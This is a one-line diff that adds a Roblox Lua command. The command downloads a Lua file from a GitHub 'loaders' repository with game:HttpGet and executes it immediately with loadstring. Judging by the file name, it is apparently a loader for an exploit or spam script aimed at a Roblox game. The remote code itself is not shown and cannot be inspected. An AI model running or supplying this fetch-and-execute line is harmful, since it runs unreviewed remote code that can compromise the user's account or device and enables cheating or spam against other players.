@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/morph-world-rainbow-dinosaurs-spam6-95j2vc0mopfp7e.lua"))()
